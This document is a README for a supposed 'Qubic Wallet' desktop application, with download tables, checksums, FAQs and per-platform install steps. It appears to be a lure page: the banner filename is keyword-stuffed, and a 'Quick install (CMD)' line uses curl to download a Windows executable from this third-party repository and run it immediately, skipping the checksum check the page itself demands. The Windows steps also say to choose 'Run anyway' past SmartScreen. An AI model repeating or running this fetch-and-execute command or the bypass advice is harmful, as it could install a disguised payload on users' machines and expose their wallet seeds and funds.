![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-app-banner.png)

# Qubic Wallet desktop application

The desktop wallet for Qubic: local accounts, Qubic assets and QX trading.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

## SHA-256 checksums

| File | SHA-256 |
| --- | --- |
| [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Check on Windows: `certutil -hashfile <file> SHA256`; macOS: `shasum -a 256 <file>`; Linux: `sha256sum <file>`. Every character must match; if it differs, delete the file and download it again.


> The desktop wallet keeps accounts on your machine instead of behind a login. That single decision
> explains the rest of this page: what the wallet holds, what it cannot recover, and why the release page
> matters more than any description of it.

## What this repository is for

This is the Qubic Wallet desktop application: the source, the build configuration and the release page
that every guide in the documentation set points back to. The wallet creates accounts locally from a
seed, stores them in an encrypted vault on your disk, holds the Qubic assets the current build supports
and includes the QX trading screen. It runs on Windows, macOS and Linux, and the installers you see above
are the ones the release publishes.

The repository is also the reference for verification. If a page elsewhere claims something about the
wallet that cannot be checked here, it is a claim rather than a fact. Version numbers, installer names,
archive formats and checksums all live on the release page, which is why the guides quote them instead of
reproducing screenshots that age badly.

There is no server-side account holding your keys. That is the property the whole product is arranged
around: nobody can restore the account for you, and nobody can freeze it either. The trade is stated
plainly in the documentation rather than buried: the seed you write down is the only recovery path, so
the backup step is the most important step in the product.

The documentation set is split by task and published as four repositories: setup and accounts,
troubleshooting, features and platform support, and trust and comparisons. Each opens with a page that
explains its cluster and lists every guide in it with one sentence about what that guide settles.

## Who it is for

- Qubic holders who want their keys on their own machine rather than in a browser session.
- Users who need to hold QU alongside the Qubic assets the build supports, and to trade on QX.
- People who have been sent a wallet link and want to check the build against its release first.
- Developers reading the source or the release configuration before running something with a seed in it.

## Start here

- [Qubic Wallet download: get the installer and verify it before you run it](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md) -
  match the file you have to the published artefact, and know when to stop and download again.
- [How to install Qubic Wallet on Windows, macOS and Linux](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-install-windows-macos-linux.md) -
  the per-platform install path, including the archive formats the builds actually ship in.
- [Creating your first Qubic Wallet account: seed type, password and backup proof](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-create-first-account.md) -
  the creation flow and the check that turns a backup into something you have proven.
- [Is Qubic Wallet safe? Source, seed and installer evidence](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/is-qubic-wallet-safe.md) -
  the checks worth running yourself, in the order that makes each later check meaningful.

## How to use this repository

1. Read the checksum table above and compare it with the file you downloaded.
2. Install from the release asset for your platform; the .zip builds are extracted, not clicked through.
3. Create the account, write the seed down in full, then test a restore while the account is empty.
4. Read the setup guides if anything in step three is unclear; they assume nothing.
5. Keep the release page open when a screen does not match a guide, and check the version you run.

## What the release contains

- Windows installer, 64-bit, for Windows 10 (1909) or later.
- macOS archive for Apple silicon, macOS 12 or later.
- Linux archive for x64, Ubuntu 20.04 or later or equivalent.
- The application source and build configuration at the tag the release names.
- SHA-256 checksums for all three installers, in the table above and on the release page.
- The documentation repositories linked from this page, published separately from the application.

## Common first questions

### Where do I get the wallet?

From the release page of this repository, which is the only location these pages point at. The download
guide explains how to match the file you received to the published artefact before you run it.

### Does the wallet hold my keys on a server?

No. Accounts are created locally from the seed and stored in a vault encrypted with your password, on
your machine. That is also why nobody can recover the account for you if the seed is lost.

### Which file do I need on a Mac?

The macOS archive for Apple silicon. It is a .zip, so you extract it and open the app inside rather than
double-clicking an installer; the install guide gives the steps in order.

### Can I run the same account on two computers?

Yes, with the same seed, and both machines see the same account. The two-devices guide explains what that
means for anyone who obtains either machine, which is the part worth thinking about before you do it.

## Before you install

- Compare the checksum of the file you downloaded with the table above; do not run a mismatch.
- Write the seed on paper, in full, and check it character by character against the wallet.
- Decide before the first transaction what you would do if this machine were lost today.
- Read the security page if you are installing on a machine you share or do not fully control.

## How to install Qubic Wallet

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

### Windows

Manual install:

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

The macOS build ships as a .zip archive, so there is no one-line command that both downloads and launches it. Extract it first, then open the app.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a>.
2. Double-click the .zip to extract it.
3. Move the extracted app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux build ships as a .zip archive as well; extract it and run the binary inside.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Extract the archive.
3. Make the extracted binary executable.
4. Run it.


## About and license

Qubic Wallet is the desktop wallet for Qubic. These pages and the application are published under the MIT license; the full text is in the documentation repository `LICENSE` file.

Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
